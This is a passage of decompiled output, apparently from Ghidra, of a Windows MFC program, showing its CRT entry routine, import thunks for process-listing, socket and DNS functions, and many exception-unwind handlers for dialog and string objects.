  puVar1 = &param_1;
  if (0xfff < in_EAX) {
    do {
      puVar1 = puVar1 + -0x1000;
      in_EAX = in_EAX - 0x1000;
    } while (0xfff < in_EAX);
  }
  *(undefined4 *)(puVar1 + (-4 - in_EAX)) = unaff_retaddr;
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void entry(void)

{
  undefined4 *puVar1;
  uint uVar2;
  HMODULE pHVar3;
  byte *pbVar4;
  HINSTANCE__ *pHVar5;
  char **local_74;
  _startupinfo local_70;
  int local_6c;
  char **local_68;
  int local_64;
  _STARTUPINFOA local_60;
  undefined *local_1c;
  void *pvStack_14;
  undefined *puStack_10;
  undefined *puStack_c;
  undefined4 local_8;
  
  puStack_c = &DAT_0040c2d8;
  puStack_10 = &DAT_0040a456;
  pvStack_14 = ExceptionList;
  local_1c = &stack0xffffff78;
  local_8 = 0;
  ExceptionList = &pvStack_14;
  __set_app_type(2);
  _DAT_0040f060 = 0xffffffff;
  DAT_0040f064 = 0xffffffff;
  puVar1 = (undefined4 *)__p__fmode();
  *puVar1 = DAT_0040f054;
  puVar1 = (undefined4 *)__p__commode();
  *puVar1 = DAT_0040f050;
  _DAT_0040f05c = *(undefined4 *)_adjust_fdiv_exref;
  FUN_00402dd9();
  if (DAT_0040e9e0 == 0) {
    __setusermatherr(&LAB_0040a452);
  }
  FUN_0040a440();
  _initterm(&DAT_0040e020,&DAT_0040e024);
  local_70.newmode = DAT_0040f04c;
  __getmainargs(&local_64,&local_74,&local_68,DAT_0040f048,&local_70);
  _initterm(&DAT_0040e000,&DAT_0040e01c);
  pbVar4 = *(byte **)_acmdln_exref;
  if (*pbVar4 != 0x22) {
    do {
      if (*pbVar4 < 0x21) goto LAB_0040a3c2;
      pbVar4 = pbVar4 + 1;
    } while( true );
  }
  do {
    pbVar4 = pbVar4 + 1;
    if (*pbVar4 == 0) break;
  } while (*pbVar4 != 0x22);
  if (*pbVar4 != 0x22) goto LAB_0040a3c2;
  do {
    pbVar4 = pbVar4 + 1;
LAB_0040a3c2:
  } while ((*pbVar4 != 0) && (*pbVar4 < 0x21));
  local_60.dwFlags = 0;
  GetStartupInfoA(&local_60);
  if ((local_60.dwFlags & 1) == 0) {
    uVar2 = 10;
  }
  else {
    uVar2 = (uint)local_60.wShowWindow;
  }
  pHVar5 = (HINSTANCE__ *)0x0;
  pHVar3 = GetModuleHandleA((LPCSTR)0x0);
  local_6c = FUN_0040a490(pHVar3,pHVar5,(char *)pbVar4,uVar2);
                    // WARNING: Subroutine does not return
  exit(local_6c);
}



void __dllonexit(void)

{
                    // WARNING: Could not recover jumptable at 0x0040a42e. Too many branches
                    // WARNING: Treating indirect jump as call
  __dllonexit();
  return;
}



void FUN_0040a434(void)

{
                    // WARNING: Treating indirect jump as call
  (*(code *)0xcf40)();
  return;
}



void _initterm(void)

{
                    // WARNING: Could not recover jumptable at 0x0040a43a. Too many branches
                    // WARNING: Treating indirect jump as call
  _initterm();
  return;
}



void FUN_0040a440(void)

{
  _controlfp(0x10000,0x30000);
  return;
}



uint __cdecl _controlfp(uint _NewValue,uint _Mask)

{
  uint uVar1;
  
                    // WARNING: Could not recover jumptable at 0x0040a45c. Too many branches
                    // WARNING: Treating indirect jump as call
  uVar1 = _controlfp(_NewValue,_Mask);
  return uVar1;
}



DWORD GetModuleBaseNameA(HANDLE hProcess,HMODULE hModule,LPSTR lpBaseName,DWORD nSize)

{
  DWORD DVar1;
  
                    // WARNING: Could not recover jumptable at 0x0040a462. Too many branches
                    // WARNING: Treating indirect jump as call
  DVar1 = GetModuleBaseNameA(hProcess,hModule,lpBaseName,nSize);
  return DVar1;
}



BOOL EnumProcesses(DWORD *lpidProcess,DWORD cb,LPDWORD lpcbNeeded)

{
  BOOL BVar1;
  
                    // WARNING: Could not recover jumptable at 0x0040a468. Too many branches
                    // WARNING: Treating indirect jump as call
  BVar1 = EnumProcesses(lpidProcess,cb,lpcbNeeded);
  return BVar1;
}



BOOL AcceptEx(SOCKET sListenSocket,SOCKET sAcceptSocket,PVOID lpOutputBuffer,
             DWORD dwReceiveDataLength,DWORD dwLocalAddressLength,DWORD dwRemoteAddressLength,
             LPDWORD lpdwBytesReceived,LPOVERLAPPED lpOverlapped)

{
  BOOL BVar1;
  
                    // WARNING: Could not recover jumptable at 0x0040a46e. Too many branches
                    // WARNING: Treating indirect jump as call
  BVar1 = AcceptEx(sListenSocket,sAcceptSocket,lpOutputBuffer,dwReceiveDataLength,
                   dwLocalAddressLength,dwRemoteAddressLength,lpdwBytesReceived,lpOverlapped);
  return BVar1;
}



void GetAcceptExSockaddrs
               (PVOID lpOutputBuffer,DWORD dwReceiveDataLength,DWORD dwLocalAddressLength,
               DWORD dwRemoteAddressLength,sockaddr **LocalSockaddr,LPINT LocalSockaddrLength,
               sockaddr **RemoteSockaddr,LPINT RemoteSockaddrLength)

{
                    // WARNING: Could not recover jumptable at 0x0040a474. Too many branches
                    // WARNING: Treating indirect jump as call
  GetAcceptExSockaddrs
            (lpOutputBuffer,dwReceiveDataLength,dwLocalAddressLength,dwRemoteAddressLength,
             LocalSockaddr,LocalSockaddrLength,RemoteSockaddr,RemoteSockaddrLength);
  return;
}



void DnsRecordListFree(void)

{
                    // WARNING: Could not recover jumptable at 0x0040a47a. Too many branches
                    // WARNING: Treating indirect jump as call
  DnsRecordListFree();
  return;
}



void DnsQuery_A(void)

{
                    // WARNING: Could not recover jumptable at 0x0040a480. Too many branches
                    // WARNING: Treating indirect jump as call
  DnsQuery_A();
  return;
}



void FUN_0040a490(HINSTANCE__ *param_1,HINSTANCE__ *param_2,char *param_3,int param_4)

{
  AfxWinMain(param_1,param_2,param_3,param_4);
  return;
}



undefined4 FUN_0040a4a8(int param_1,undefined4 param_2)

{
  AFX_MODULE_STATE *pAVar1;
  
  pAVar1 = AfxGetModuleState();
  pAVar1[0x14] = SUB41(param_1,0);
  *(undefined4 *)(pAVar1 + 0x1040) = param_2;
  if (param_1 == 0) {
    _setmbcp(-3);
  }
  return 1;
}



int AfxWinMain(HINSTANCE__ *param_1,HINSTANCE__ *param_2,char *param_3,int param_4)

{
  int iVar1;
  
                    // WARNING: Could not recover jumptable at 0x0040a4e8. Too many branches
                    // WARNING: Treating indirect jump as call
  iVar1 = AfxWinMain(param_1,param_2,param_3,param_4);
  return iVar1;
}



void Unwind_0040a4f0(void)

{
  int unaff_EBP;
  
  CDialog::~CDialog(*(CDialog **)(unaff_EBP + -0x10));
  return;
}



void Unwind_0040a4f8(void)

{
  int unaff_EBP;
  
  CListCtrl::~CListCtrl((CListCtrl *)(*(int *)(unaff_EBP + -0x10) + 0x60));
  return;
}



void Unwind_0040a503(void)

{
  int unaff_EBP;
  
  CListCtrl::~CListCtrl((CListCtrl *)(*(int *)(unaff_EBP + -0x10) + 0xa0));
  return;
}



void Unwind_0040a511(void)

{
  int unaff_EBP;
  
  CComboBox::~CComboBox((CComboBox *)(*(int *)(unaff_EBP + -0x10) + 0xe0));
  return;
}



void Unwind_0040a51f(void)

{
  int unaff_EBP;
  
  CComboBox::~CComboBox((CComboBox *)(*(int *)(unaff_EBP + -0x10) + 0x120));
  return;
}



void Unwind_0040a52d(void)

{
  int unaff_EBP;
  
  CString::~CString((CString *)(*(int *)(unaff_EBP + -0x10) + 0x160));
  return;
}



void Unwind_0040a53b(void)

{
  int unaff_EBP;
  
  CString::~CString((CString *)(*(int *)(unaff_EBP + -0x10) + 0x164));
  return;
}



void Unwind_0040a549(void)

{
  int unaff_EBP;
  
  CString::~CString((CString *)(*(int *)(unaff_EBP + -0x10) + 0x170));
  return;
}



void Unwind_0040a557(void)

{
  int unaff_EBP;
  
  CString::~CString((CString *)(*(int *)(unaff_EBP + -0x10) + 0x174));
  return;
}



void Unwind_0040a570(void)

{
  int unaff_EBP;
  
  CDialog::~CDialog(*(CDialog **)(unaff_EBP + -0x10));
  return;
}



void Unwind_0040a578(void)

{
  int unaff_EBP;
  
  CListCtrl::~CListCtrl((CListCtrl *)(*(int *)(unaff_EBP + -0x10) + 0x60));
  return;
}



void Unwind_0040a583(void)

{
  int unaff_EBP;
  
  CListCtrl::~CListCtrl((CListCtrl *)(*(int *)(unaff_EBP + -0x10) + 0xa0));
  return;
}



void Unwind_0040a591(void)

{
  int unaff_EBP;
  
  CComboBox::~CComboBox((CComboBox *)(*(int *)(unaff_EBP + -0x10) + 0xe0));
  return;
}



void Unwind_0040a59f(void)

{
  int unaff_EBP;
  
  CComboBox::~CComboBox((CComboBox *)(*(int *)(unaff_EBP + -0x10) + 0x120));
  return;
}



void Unwind_0040a5ad(void)

{
  int unaff_EBP;
  
  CString::~CString((CString *)(*(int *)(unaff_EBP + -0x10) + 0x160));
  return;
}



void Unwind_0040a5bb(void)

{
  int unaff_EBP;
  
  CString::~CString((CString *)(*(int *)(unaff_EBP + -0x10) + 0x164));
  return;
}



void Unwind_0040a5c9(void)

{
  int unaff_EBP;
  
  CString::~CString((CString *)(*(int *)(unaff_EBP + -0x10) + 0x170));
  return;
}



void Unwind_0040a5e4(void)

{
  int unaff_EBP;
  
  CString::~CString((CString *)(unaff_EBP + -0x14));
  return;
}



void Unwind_0040a5ec(void)

{
  int unaff_EBP;
  
  CString::~CString((CString *)(unaff_EBP + -0x28));
  return;
}



void Unwind_0040a5f4(void)

{
  int unaff_EBP;
  
  CString::~CString((CString *)(unaff_EBP + -0x28));
  return;
}



void Unwind_0040a5fc(void)

{
  int unaff_EBP;
  
  CString::~CString((CString *)(unaff_EBP + -0x24));
  return;
}



void Unwind_0040a604(void)

{
  int unaff_EBP;
  
  CString::~CString((CString *)(unaff_EBP + -0x24));
  return;
}



void Unwind_0040a618(void)

{
  int unaff_EBP;
  
  CString::~CString((CString *)(unaff_EBP + -0x1c));
  return;
}



void Unwind_0040a62c(void)

{
  int unaff_EBP;
  
  CString::~CString((CString *)(unaff_EBP + -0x14));
  return;
}



void Unwind_0040a640(void)

{
  int unaff_EBP;
  
  CString::~CString((CString *)(unaff_EBP + -0x10));
  return;
}



void Unwind_0040a648(void)

{
  int unaff_EBP;
  
  CString::~CString((CString *)(unaff_EBP + -0x20));
  return;
}



void Unwind_0040a65c(void)

{
  int unaff_EBP;
  
  CString::~CString((CString *)(unaff_EBP + -0x10));
  return;
}



void Unwind_0040a670(void)

{
  int unaff_EBP;
  
  FUN_00403228((void *)(unaff_EBP + -0x70));
  return;
}



void Unwind_0040a684(void)

{
  int unaff_EBP;
  
  CString::~CString((CString *)(unaff_EBP + 8));
  return;
}



void Unwind_0040a698(void)

{
  int unaff_EBP;
  
  CString::~CString((CString *)(unaff_EBP + -0x14));
  return;
}



void Unwind_0040a6a0(void)

{
  int unaff_EBP;
  
  CString::~CString((CString *)(unaff_EBP + 8));
  return;
}



void Unwind_0040a6b4(void)

{
  int unaff_EBP;
  
  CString::~CString((CString *)(unaff_EBP + -0x18));
  return;
}



void Unwind_0040a6bc(void)

{
  int unaff_EBP;
  
  CString::~CString((CString *)(unaff_EBP + -0x1c));
  return;
}



void Unwind_0040a6d0(void)

{
  int unaff_EBP;
  
  CString::~CString((CString *)(unaff_EBP + -0x10));
  return;
}



void Unwind_0040a6e4(void)

{
  int unaff_EBP;
  
  CString::~CString((CString *)(unaff_EBP + -0x10));
  return;
}



void Unwind_0040a6ec(void)

{
  int unaff_EBP;
  
  CString::~CString((CString *)(unaff_EBP + -0x1c));
  return;
}



void Unwind_0040a6f4(void)

{
  int unaff_EBP;
  
  CString::~CString((CString *)(unaff_EBP + -0x20));
  return;
}



void Unwind_0040a708(void)

{
  int unaff_EBP;
  
  operator_delete(*(void **)(unaff_EBP + -0x10));
  return;
}



void Unwind_0040a71c(void)

{
  int unaff_EBP;
  
  thunk_FUN_00403516((void **)(*(int *)(unaff_EBP + -0x14) + 4));
  return;
}



void Unwind_0040a734(void)

{
  int unaff_EBP;
  
  FUN_00403ba7((undefined4 *)(*(int *)(unaff_EBP + -0x10) + 4));
  return;
}



void Unwind_0040a74c(void)

{
  int unaff_EBP;
  
  FUN_00403ba7((undefined4 *)(*(int *)(unaff_EBP + -0x10) + 4));
  return;
}



void Unwind_0040a764(void)

{
  int unaff_EBP;
  
  FUN_004089a3(*(void **)(unaff_EBP + -0x10));
  return;
}



void Unwind_0040a778(void)

{
  int unaff_EBP;
  
  CWinApp::~CWinApp(*(CWinApp **)(unaff_EBP + -0x10));
  return;
}



void Unwind_0040a780(void)

{
  FUN_00404ee8();
  return;
}



void Unwind_0040a78e(void)

{
  int unaff_EBP;
  
  CString::~CString((CString *)(*(int *)(unaff_EBP + -0x10) + 0x174));
  return;
}



void Unwind_0040a79c(void)

{
  int unaff_EBP;
  
  CString::~CString((CString *)(*(int *)(unaff_EBP + -0x10) + 0x178));
  return;
}



void Unwind_0040a7b4(void)

{
  int unaff_EBP;
  
  CWinApp::~CWinApp(*(CWinApp **)(unaff_EBP + -0x10));
  return;
}



void Unwind_0040a7bc(void)

{
  FUN_00404ee8();
  return;
}



void Unwind_0040a7ca(void)

{
  int unaff_EBP;
  
  CString::~CString((CString *)(*(int *)(unaff_EBP + -0x10) + 0x174));
  return;
}



void Unwind_0040a7d8(void)

{
  int unaff_EBP;
  
  CString::~CString((CString *)(*(int *)(unaff_EBP + -0x10) + 0x178));
  return;
}



void Unwind_0040a7f0(void)

{
  FUN_00404ee8();
  return;
}



void Unwind_0040a7fb(void)

{
  FUN_00402dd9();
  return;
}



void Unwind_0040a803(void)

{
  FUN_00401179();
  return;
}



void Unwind_0040a818(void)

{
  FUN_00404ee8();
  return;
}



void Unwind_0040a823(void)

{
  FUN_00402dd9();
  return;
}



void Unwind_0040a838(void)

{
  FUN_004092ed();
  return;
}



void Unwind_0040a850(void)

{
  int unaff_EBP;
  
  CDialog::~CDialog(*(CDialog **)(unaff_EBP + -0x10));
  return;
}



void Unwind_0040a858(void)

{
  int unaff_EBP;
  
  CWnd::~CWnd((CWnd *)(*(int *)(unaff_EBP + -0x10) + 0x60));
  return;
}



void Unwind_0040a870(void)

{
  FUN_00402dd9();
  return;
}



void Unwind_0040a884(void)

{
  int unaff_EBP;
  
  CDialog::~CDialog(*(CDialog **)(unaff_EBP + -0x10));
  return;
}



void Unwind_0040a88c(void)

{
  int unaff_EBP;
  
  CWnd::~CWnd((CWnd *)(*(int *)(unaff_EBP + -0x10) + 0x60));
  return;
}



void Unwind_0040a897(void)

{
  int unaff_EBP;
  
  CString::~CString((CString *)(*(int *)(unaff_EBP + -0x10) + 0xa4));
  return;
}



void Unwind_0040a8b0(void)

{
  int unaff_EBP;
  
  FUN_004089a3(*(void **)(unaff_EBP + -0x10));
  return;
}



void Unwind_0040a8c4(void)

{
  int unaff_EBP;
  
  FUN_004089a3(*(void **)(unaff_EBP + -0x10));
  return;
}


